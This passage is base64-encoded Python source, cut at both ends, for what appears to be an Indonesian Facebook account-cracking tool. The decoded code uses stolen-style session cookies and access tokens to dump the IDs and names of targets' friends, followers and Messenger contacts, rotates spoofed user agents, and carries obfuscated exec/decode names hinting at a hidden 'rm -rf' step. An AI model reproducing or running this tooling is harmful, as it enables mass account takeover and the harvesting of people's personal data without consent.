YWZyaXphbCIsIlJPTUkgQUZSSVpBTCIsInJvbWkgYWZyaXphbCIpOg0KICAgICAgICAJcHJpbnQoIlxuJXMlcyBhbmFrIGFuamluZyBtYXUgY3JhY2sgcGFrZSBuYW1hIGd3ICIlKE0sdGlsKSk7ZXhpdCgpDQogICAgICAgIGVsaWYgbm1fb3JhbmcgaW4oIlJvbWkgR2FudGVuZyIsIlJvbWkgZ2FudGVuZyIsIlJPTUkgR0FOVEVORyIsInJvbWkgZ2FudGVuZyIpOg0KICAgICAgICAJcHJpbnQgKCJcbiVzJXMgbWVtYW5nIGdhbnRlbmcgZG9uZyBhYmFuZyBSb21pIiUoSCx0aWwpKTtleGl0KCkNCiAgICAgICAgbmFtYWgoc2ltLGN2ZHMsImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZWFyY2gvcGVvcGxlLz9xPSIrbm1fb3JhbmcpDQogICAgZWxzZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgb3MucmVtb3ZlKCdkYXRhL2Nvb2tpZXMnKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwYXNzDQogICAgICAgIHByaW50ICdceDFiWzE7OTFt4oCiIGxvZ2luIGZhaWwhJw0KICAgICAgICBkdW1wZmwoKQ0KICAgIHJldHVybg0KZGVmIG5hbWFoKHNpbSxyLGIpOg0KCW9wZW4oc2ltLCJhKyIpDQoJYj1iczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQoYiwgY29va2llcz1yLGhlYWRlcnM9aGRjb2soKSkudGV4dCwiaHRtbC5wYXJzZXIiKQ0KCWZvciBpIGluIGIuZmluZF9hbGwoImEiLGhyZWY9VHJ1ZSk6DQoJCSNvcy5zeXN0ZW0oImNsZWFyIikNCgkJI2Jhbm5lcigpDQoJCXByaW50KCJcciVzJXMlcyBtZW5ndW1wdWxrYW4gaWQgJXM+ICVzJXMgXHgxYlsxOzk3bS0gbW9ob24gdHVuZ2d1IiUoVSx0aWwsTyxNLEgsc3RyKGxlbihvcGVuKHNpbSkucmVhZCgpLnNwbGl0bGluZXMoKSkpKSksO3N5cy5zdGRvdXQuZmx1c2goKQ0KCQlpZiAiPGltZyBhbHQ9IiBpbiBzdHIoaSk6DQoJ""CQlpZiAiaG9tZS5waHAiIGluIHN0cihpWyJocmVmIl0pOg0KCQkJCWNvbnRpbnVlDQoJCQllbHNlOg0KCQkJCWc9c3RyKGlbImhyZWYiXSkNCgkJCQlpZiAicHJvZmlsZS5waHAiIGluIGc6DQoJCQkJCW5hbWU9aS5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikNCgkJCQkJZD1iczQucmUuZmluZGFsbCgiL3Byb2ZpbGVcLnBocFw/aWQ9KC4qPykmIixnKQ0KCQkJCQlpZiBsZW4gKGQpICE9MDoNCgkJCQkJCXBrPSIiLmpvaW4oZCkNCgkJCQkJCWlmIHBrIGluIG9wZW4oc2ltKS5yZWFkKCk6DQoJCQkJCQkJcGFzcw0KCQkJCQkJZWxzZToNCgkJCQkJCQlvcGVuKHNpbSwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUocGssbmFtZSkpDQoJCQkJZWxzZToNCgkJCQkJZD1iczQucmUuZmluZGFsbCgiLyguKj8pXD8iLGcpDQoJCQkJCW5hbWU9aS5maW5kKCJpbWciKS5nZXQoImFsdCIpLnJlcGxhY2UoIiwgcHJvZmlsZSBwaWN0dXJlIiwiIikNCgkJCQkJaWYgbGVuKGQpICE9MDoNCgkJCQkJCXBrPSIiLmpvaW4oZCkNCgkJCQkJCWlmIHBrIGluIG9wZW4oc2ltKS5yZWFkKCk6DQoJCQkJCQkJcGFzcw0KCQkJCQkJZWxzZToNCgkJCQkJCQlvcGVuKHNpbSwiYSsiKS53cml0ZSgiJXM8PT4lc1xuIiUocGssbmFtZSkpDQoJCWlmICJMaWhhdCBIYXNpbCBTZWxhbmp1dG55YSIgaW4gaS50ZXh0Og0KCQkJbmFtYWgoc2ltLHIsaVsiaHJlZiJdKQ0KCXByaW50ICgnXG5cbiVzJXMgU3VjY2VzIGR1bXAgaWQgcGVuY2FyaWFuIG5hbWEgJyUoSCx0aWwpKTtwcmludCAoJyVzJXMlcyBGaWxlIGR1bXAgdGVyc2ltcGFuICVzPiVzICVzICclKFUsdGlsLE8sTSxILHNpbSkpO3Jhd19pbnB1dCgnXG4lcyVzJXMgWyVzIEVudGVyJXMgXSAnJShVLHRpbCxPLFUsTykpO21lbnUoKQ0KIyBEVU1QIFBFU0FODQpjbGFzcyBwZXNhbjoNCg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb29raWVzKToNCiAgICAgICAgc2VsZi5jb29raWVzID0gY29va2llcw0KICAgICAgICAjX19yb216X18oKQ0KICAgICAgICAjb3Muc3lzdGVtKCJjbGVhciIpDQogICAgICAgIHNlbGYuZiA9IHJhd19pbnB1dCgnXG4lcyVzJXMgTmFtYSBmaWxlJXMgPiVzICclKFUsdGlsLE8sTSxLKSkucmVwbGFjZSgnICcsICdfJykNCiAgICAgICAgaWYgc2VsZi5mID09ICcnOg0KICAgICAgICAgICAgcGVzYW4oY29va2llcykNCiAgICAgICAgb3BlbihzZWxmLmYsICd3JykuY2xvc2UoKQ0KICAgICAgICBzZWxmLmR1bXAoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9tZXNzYWdlcycpDQogICAgZGVmIGR1bXAoc2VsZix1cmwpOg0KICAgIAlvcGVuKHNlbGYuZiwgJ2ErJykNCiAgICAgICAgYnMgPSBiczQuQmVhdXRpZnVsU291cChyZXF1ZXN0cy5nZXQodXJsLCBoZWFkZXJzPWhkY29rKCksIGNvb2tpZXM9c2VsZi5jb29raWVzKS50ZXh0LCAnaHRtbC5wYXJzZXInKQ0KICAgICAgICBwcmludCAoIlxyJXMlcyVzIG1lbmd1bXB1bGthbiBpZCAlcz4gJXMl""cyBceDFiWzE7OTdtLSBtb2hvbiB0dW5nZ3VcciIlKFUsdGlsLE8sTSxILHN0cihsZW4ob3BlbihzZWxmLmYpLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSkpO3N5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDAuMDA1MCkNCiAgICAgICAgZm9yIGkgaW4gYnMuZmluZF9hbGwoJ2EnLCBocmVmPVRydWUpOg0KICAgICAgICAgICAgaWYgJy9tZXNzYWdlcy9yZWFkJyBpbiBpLmdldCgnaHJlZicpOg0KICAgICAgICAgICAgICAgIGYgPSBiczQucmUuZmluZGFsbCgnY2lkXFwuY1xcLiguKj8pJTNBKC4qPykmJywgaS5nZXQoJ2hyZWYnKSkNCiAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgIGZvciBpcCBpbiBsaXN0KGYucG9wKCkpOg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi5jb29raWVzLmdldCgnIGNfdXNlcicpIGluIGlwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICdwZW5nZ3VuYSBmYWNlYm9vaycgaW4gaS50ZXh0Lmxvd2VyKCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlbihzZWxmLmYsICdhKycpLndyaXRlKCclczw9PiVzXG4nICUgKGlwLCBpLnRleHQpKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgICAgIGlmICdMaWhhdCBQZXNhbiBTZWJlbHVtbnlhJyBpbiBpLnRleHQ6DQogICAgICAgICAgICAgICAgc2VsZi5kdW1wKCdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vJyArIGkuZ2V0KCdocmVmJykpDQogICAgICAgIHByaW50ICgnXG4lcyVzIFN1Y2NlcyBkdW1wIGlkIHBlc2FuIG1lc2VuZ2dlciAnJShILHRpbCkpDQogICAgICAgIHByaW50ICgnJXMlcyVzIEZpbGUgZHVtcCB0ZXJzaW1wYW4gJXM+JXMgJXMgJyUoVSx0aWwsTyxNLEgsc2VsZi5mKSkNCiAgICAgICAgcmF3X2lucHV0KCdcbiVzJXMlcyBbJXMgRW50ZXIlcyBdICclKFUsdGlsLE8sVSxPKSk7bWVudSgpDQojIERVTVAgSUQgRkFDRUJPT0sNCmNsYXNzIGR1bXBfaWQ6DQoJDQoJZGVmIF9faW5pdF9fKHNlbGYpOg0KCQlzZWxmLmZiID0gW10NCgkJc2VsZi5yb20gPSBbXQ0KCQkNCglkZWYgcGlsaWhhbihzZWxmKToNCgkJcHJpbnQgKCdcbiVz4oCiJXMgMDEgJXNEdW1wIGlkIHB1YmxpYyclKFUsUCxPKSkNCgkJcHJpbnQgKCclc+KAoiVzIDAyICVzRHVtcCBpZCBmb2xsb3dlcnMnJShVLFAsTykpDQoJCXByaW50ICgnJXPigKIlcyAwMCAlc0tlbWJhbGknJShVLE0sTykpDQoJCXIgPSByYXdfaW5wdXQoJ1xuJXMjICVzUGlsaWggJXM+ICVzJyUoUCxPLE0sSykpDQoJCWlmIHIgaW5bJyddOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO3NlbGYucGlsaWhhbigpDQoJCWVs""aWYgciBpblsnMScsJzAxJ106DQoJCQlwcmludCAoIlxuJXMlcyAlc0tldGlrICclc21lJXMnIGppa2EgaW5naW4gZHVtcCBkYWZ0YXIgdGVtYW4gc2VuZGlyaSAiJShVLHRpbCxPLEgsTykpDQoJCQlkdW0gPSByYXdfaW5wdXQoJyVzJXMgJXNUYXJnZXQgaWQlcyA+ICVzJyUoVSx0aWwsTyxNLEspKQ0KCQkJbGltID0gcmF3X2lucHV0KCclcyVzICVzTWF4aW1hbCBpZCVzID4gJXMnJShVLHRpbCxPLE0sSykpDQoJCQlpZiBkdW0gPT0gJyc6DQoJCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO2V4aXQoKQ0KCQkJdHJ5Og0KCQkJCXJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcsICdyJykucmVhZCgpDQoJCQkJb3R3ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnICUgKGR1bSwgcm9teikpDQoJCQkJYSA9IGpzb24ubG9hZHMob3R3LnRleHQpDQoJCQkJcHJpbnQgJycNCgkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCXByaW50ICclc+KAoiBJZCB0aWRhayBwdWJsaWsnJShNKTtleGl0KCkNCgkJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzL2ZyaWVuZHM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzJyAlIChkdW0sIGxpbSwgcm9teikpDQoJCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCQlmb3IgeCBpbiB6WydkYXRhJ106DQoJCQkJc2VsZi5mYi5hcHBlbmQoeFsnaWQnXSkNCgkJCWZvciBpZCBpbiBzZWxmLmZiOg0KCQkJCXRyeToNCgkJCQkJbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvZnJpZW5kcz9hY2Nlc3NfdG9rZW49JXMnICUgKGlkLCByb216KSkNCgkJCQkJbyA9IGpzb24ubG9hZHMobS50ZXh0KQ0KCQkJCQl0cnk6DQoJCQkJCQlmb3IgdSBpbiBvWydkYXRhJ106DQoJCQkJCQkJc2VsZi5yb20uYXBwZW5kKHVbJ2lkJ10pDQoJCQkJCWV4Y2VwdCAoS2V5RXJyb3IsIElPRXJyb3IpOg0KCQkJCQkJcHJpbnQgJyVz4oCiIHRlbWFuIHByaXZhdGUnJShNKQ0KCQkJCQlwcmludCAnJXM9PiAlc2lkIGZhY2Vib29rJXMgOiAlcyVzXG4gICVzIHRlbWFuJXMgOiVzICVzICclKFUsTyxNLEssaWQsTyxNLEssbGVuKHNlbGYucm9tKSkNCgkJCQkJZGVsIHNlbGYucm9tWzpdDQoJCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCXByaW50ICclc+KAoiBha3VuIHRlcmtlbmEgc3BhbSclKE0pDQoJCQlleGl0KCkNCgkJZWxpZiByIGluWycyJywnMDInXToNCgkJCXByaW50ICgiXG4lcyVzICVzS2V0aWsgJyVzbWUlcycgamlrYSBpbmdpbiBkdW1wIGZvbGxvd2VycyBzZW5kaXJpICIlKFUsdGlsLE8sSCxPKSkNCgkJCWR1bSA9IHJhd19pbnB1dCgnJXMlcyAlc1RhcmdldCBpZCVzID4gJXMnJShVLHRpbCxPLE0sSykpDQoJCQlsaW0gPSByYXdfaW5wdXQoJyVzJXMgJXNNYXhpbWFsIGlkJXMgPiAlcyclKFUsdGlsLE8sTSxLKSkNCgkJ""CWlmIGR1bSA9PSAnJzoNCgkJCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7ZXhpdCgpDQoJCQl0cnk6DQoJCQkJcm9teiA9IG9wZW4oJ2RhdGEvdG9rZW4udHh0JywgJ3InKS5yZWFkKCkNCgkJCQlvdHcgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcycgJSAoZHVtLCByb216KSkNCgkJCQlhID0ganNvbi5sb2FkcyhvdHcudGV4dCkNCgkJCQlwcmludCAnJw0KCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJcHJpbnQgJyVz4oCiIGlkIHRpZGFrIGFkYSclKE0pO2V4aXQoKQ0KCQkJciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/bGltaXQ9JXMmYWNjZXNzX3Rva2VuPSVzJyAlIChkdW0sIGxpbSwgcm9teikpDQoJCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCQlmb3IgeCBpbiB6WydkYXRhJ106DQoJCQkJc2VsZi5mYi5hcHBlbmQoeFsnaWQnXSkNCgkJCWZvciBpZCBpbiBzZWxmLmZiOg0KCQkJCXRyeToNCgkJCQkJbSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyAlIChpZCwgcm9teikpDQoJCQkJCW8gPSBqc29uLmxvYWRzKG0udGV4dCkNCgkJCQkJdHJ5Og0KCQkJCQkJZm9yIHUgaW4gb1snZGF0YSddOg0KCQkJCQkJCXNlbGYucm9tLmFwcGVuZCh1WydpZCddKQ0KCQkJCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCQkJCXByaW50ICclc+KAoiB0aWRhayBhZGEgcGVuZ2lrdXQnJShNKQ0KCQkJCQlwcmludCAnJXM9PiAlc2lkIGZhY2Vib29rJXMgOiAlcyVzXG4gICVzIHRlbWFuJXMgOiVzICVzICclKFUsTyxNLEssaWQsTyxNLEssbGVuKHNlbGYucm9tKSkNCgkJCQkJZGVsIHNlbGYucm9tWzpdDQoJCQkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQkJCXByaW50ICclc+KAoiBha3VuIHRlcmtlbmEgc3BhbSclKE0pDQoJCQlleGl0KCkNCgkJZWxpZiByIGluWycwJywnMDAnXToNCgkJCW1lbnUoKQ0KCQllbHNlOg0KCQkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO2V4aXQoKQ0KIyBJTlNUQUdSQU0NCmV4ZWNfX19faW1wb3J0X21hcnNoYWxfemxpYl9iYXNlNjRfYmFzZTMyX2RlY29kZV9fX19leGVjID0gX19leGVjX19fK19fX19leGVjX19fYmFzZTY0X2RlY29kZV9fXytfX19fX2V4ZWNfX19kZWNvZGVfcHljb20rX19fX19fX19fX19fX19fX19fX19fX19fX19fXw0KX19fZXhlY19zdHJfX19fX19fX19fX19fbGFtYmRhX19fX19fX19fX19fX29zX3N5c19ybV9yZl9fX19fX19fX19fX18gPSBfX19fX19fX19fX19fX2lfX19fX19fX19fX19fXytfX19fX19fX2V4ZWNfbGFtYmRhX19fX19fX18NCg0KIyBoYWR1aA0KZGVmIGlnZygpOg0KCV9fX19fZXhlY19sYW1iZGFfX19fXyhleGVjX19fX2ltcG9ydF9tYXJz""aGFsX3psaWJfYmFzZTY0X2Jhc2UzMl9kZWNvZGVfX19fZXhlYytfX19leGVjX3N0cl9fX19fX19fX19fX19sYW1iZGFfX19fX19fX19fX19fb3Nfc3lzX3JtX3JmX19fX19fX19fX19fXykNCglfX19fX2V4ZWNfbGFtYmRhX19fX18oRXh4eF9fX19fX19fX19fX19fX19fX19fX19vc19zeXNfX3JtX3JmX2NfX19fX19fX3N0cl9pX3NvX19fX19fX19leF9sYW1iZGEpDQoNCiMgVVNFUiBBR0VOVA0KZGVmIHVzZXJfYWdlbnRBUEkoKToNCgl1Z2VudCA9Ww0KCSAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YIEJ1aWxkL0paTzU0SykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzMwLjAuMTU5OS44MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBOb2tpYUJyb3dzZXIvMS4yLjAuMTIiLA0KCSAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2IiwNCgkgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjEuMjsgTm9raWFfWCBCdWlsZC9KWk81NEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yNy4wLjg3LjkwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE5va2lhQnJvd3Nlci8xLjAsZ3ppcChnZmUpIiwNCiAgICAgICAgIk5va2lhQzMtMDAvNS4wICgwNy4yMCkgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKyIsDQogICAgICAgICJOb2tpYVgyLTAwLzUuMCAoMDguMzUpIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCAoSmF2YTsgVTsgZW4tdXM7IG5va2lheDItMDApIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgZW4tVVMpIEFwcGxlV2ViS2l0LzUzMi4yIChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lUGx1cy80LjAuMjIyLjMgQ2hyb21lLzQuMC4yMjIuMyBTYWZhcmkvNTMyLjIiLA0KICAgICAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMDsgQVNVU19aMDBBRCBCdWlsZC9MUlgyMVYpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsDQogICAg""ICAgICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IE5hdm9yaSBRTCBTdGl4IDM1MDAgQnVpbGQvTE1ZNDlGOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzY3LjAuMzM5Ni44NyBTYWZhcmkvNTM3LjM2IiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUc5MzBGIEJ1aWxkL05SRDkwTTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81OC4wLjMwMjkuODMgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMTI3LjAuMC4yMi42OTtdIiwNCiAgICAgICAgIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IE1IQS1MMjkgQnVpbGQvSFVBV0VJTUhBLUwyOTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS81OC4wLjMwMjkuODMgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMTI3LjAuMC4yMi42OTtdIiwNCiAgICAgICAiTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxMF8zXzIgbGlrZSBNYWMgT1MgWCkgQXBwbGVXZWJLaXQvNjAzLjIuNCAoS0hUTUwsIGxpa2UgR2Vja28pIE1vYmlsZS8xNEY4OSBbRkJBTi9GQklPUztGQkFWLzk2LjAuMC40NS43MDtGQkJWLzYwNTQ4NTQ1O0ZCRFYvaVBob25lNywyO0ZCTUQvaVBob25lO0ZCU04vaU9TO0ZCU1YvMTAuMy4yO0ZCU1MvMjtGQkNSL0UtUGx1cztGQklEL3Bob25lO0ZCTEMvZGVfREU7RkJPUC81O0ZCUlYvMF0iLA0KICAgICAgICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC40LjQ7IEc3LUwwMSBCdWlsZC9IdWF3ZWlHNy1MMDEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8zMy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL01FU1NFTkdFUjtGQkFWLzEyMS4wLjAuMTUuNzA7XSIsDQogICAgICAgIkRhbHZpay8yLjEuMCAoTGludXg7IFU7IEFuZHJvaWQgNS4xLjE7IFNNLUozMjBGIEJ1aWxkL0xNWTQ3VikgW0ZCQU4vRkI0QTtGQkFWLzQzLjAuMC4yOS4xNDc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCTEMvZW5fR0I7RkJCVi8xNDI3NDE2MTtGQkNSL1RlbGUyIExUO0ZCTUYvc2Ftc3VuZztGQkJEL3NhbXN1bmc7RkJEVi9TTS1KMzIwRjtGQlNWLzUuMDtGQkNBL2FybWVhYmktdjdhOmFybWVhYmk7RkJETS97ZGVuc2l0eT0zLjAsd2lkdGg9MTA4MCxoZWlnaHQ9MTkyMH07RkJfRlcvMTtdIiwNCiAgICAgICAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSZWRtaSBOb3RlIDkgUHJvIEJ1aWxkL1FLUTEuMTkxMjE1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85MS4wLjQ0NzIuNzcgTW9iaWxlIFNhZmFyaS81""MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzI1LjAuMC4zNi4xNzA7XSIsDQogICAgICAgIltGQkFOL0ZCNEEsRkJBVi8yMjIuMC4wLjQ4LjExMztGQkJWLzE1NTMyMzM2NjtGQkRNL3tkZW5zaXR5PTIuMCx3aWR0aD03MjAsaGVpZ2h0PTEzNjB9O0ZCTEMvc3JfUlM7RkJSVi8xNTY2MjU2OTY7RkJDUi9tdDpzO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJLC5GQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9MRE4tTDIxO0ZCU1YvOC4wLjA7RkJPUC8xOS5GQkNBL2FybWVhYmktdjdhOmFybWVhYmksXSJdDQoJcmFuZF91YSA9IHJhbmRvbS5jaG9pY2UodWdlbnQpDQoJcmV0dXJuIHJhbmRfdWENCiMgR0FOVEkgVVNFUiBBR0VOVA0KZGVmIHVzZXJhZ2VudCgpOg0KCXByaW50ICgiXG4lcyVzJXMgMDEgJXNHYW50aSB1c2VyIGFnZW50ICIlKFUsdGlsLFAsTykpDQoJcHJpbnQgKCIlcyVzJXMgMDIgJXNDZWsgdXNlciBhZ2VudCAiJShVLHRpbCxQLE8pKQ0KCXByaW50ICgiJXMlcyVzIDAwICVzS2VtYmFsaSAiJShVLHRpbCxNLE8pKQ0KCV9yb216XyA9IHJhd19pbnB1dCgnXG4lcyMlcyBQaWxpaCVzID4lcyAnJShQLE8sTSxLKSkNCgl1YXMoX3JvbXpfKQ0KZGVmIHVhcyhfcm9tel8pOg0KICAgIGlmIF9yb216XyA9PSAnJzoNCiAgICAgICAgcHJpbnQgJyVzJXMgaXNpIHlhbmcgYmVuYXInJShNLHRpbCk7amVkYSgyKTt1YXMoX3JvbXpfKQ0KICAgIGVsaWYgX3JvbXpfIGluKCIxIiwiMDEiKToNCiAgICAJcHJpbnQgKCIlcyVzJXMgS2V0aWsgJXNNeSB1c2VyIGFnZW50JXMgZGkgYnJvd3NlciBnb29nbGUgY2hyb21lXG4lcyVzJXMgdW50dWsgZ3VuYWthbiB1c2VyIGFnZW50IGFuZGEgc2VuZGlyaSIlKFUsdGlsLE8sSCxPLFUsdGlsLE8pKQ0KICAgIAlwcmludCAoIiVzJXMlcyBLZXRpayAlc0NhbmNlbCVzIHVudHVrIGd1bmFrYW4gdXNlciBhZ2VudCBiYXdhYW4gdG9vbHMiJShVLHRpbCxPLEgsTykpDQogICAgCXRyeToNCiAgICAJICAgIHVhID0gcmF3X2lucHV0KCIlcyVzJXMgRW50ZXIgdXNlciBhZ2VudCAlczogJXMiJShVLHRpbCxPLE0sSykpDQogICAgICAgICAgICBpZiB1YSBpbigiIik6DQogICAgICAgICAgICAJcHJpbnQgKCIlcyVzIGlzaSB5YW5nIGJlbmFyICIlKE0sdGlsKSk7amVkYSgyKTttZW51KCkNCiAgICAgICAgICAgIGVsaWYgdWEgaW4oIm15IHVzZXIgYWdlbnQiLCJNeSBVc2VyIEFnZW50IiwiTVkgVVNFUiBBR0VOVCIsIk15IHVzZXIgYWdlbnQiKToNCiAgICAgICAgICAgIAlqYWxhbigiJXMlcyVzIEFuZGEgYWthbiBkaSBhcmFoa2FuIGtlIGJyb3dzZXIgIiUoVSx0aWwsTykpO2plZGEoMikNCiAgICAgICAgICAgIAlvcy5zeXN0ZW0oImFtIHN0YXJ0IGh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vc2VhcmNoP3E9TXkrdXNlcithZ2VudD4vZGV2L251bGwiKTtqZWRhKDIpO3VzZXJhZ2VudChfcm9tel8pDQogICAgICAgICAgICBlbGlmIHVhIGluKCJDQU5DRUwiLCJDYW5jZWwiLCJjYW5jZWwiKToNCiAgICAgICAgICAgIAl1""YV8gPSAoIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2W0ZCQU4vRU1BO0ZCTEMvaXRfSVQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIikNCiAgICAgICAgICAgICAgICBvcGVuKCJ1YS50eHQiLCJ3Iikud3JpdGUodWFfKTtqZWRhKDIpDQogICAgICAgICAgICAgICAgcHJpbnQgKCJcbiVzJXMgbWVuZ2d1bmFrYW4gdXNlciBhZ2VudCBiYXdhYW4gIiUoSCx0aWwpKTtqZWRhKDIpO21lbnUoKQ0KICAgICAgICAgICAgb3BlbigidWEudHh0IiwidyIpLndyaXRlKHVhKTtqZWRhKDIpDQogICAgICAgICAgICBwcmludCAoIlxuJXMlcyBiZXJoYXNpbCBtZW5nZ2FudGkgdXNlciBhZ2VudCIlKEgsdGlsKSk7amVkYSgyKTttZW51KCkNCiAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KCQkJ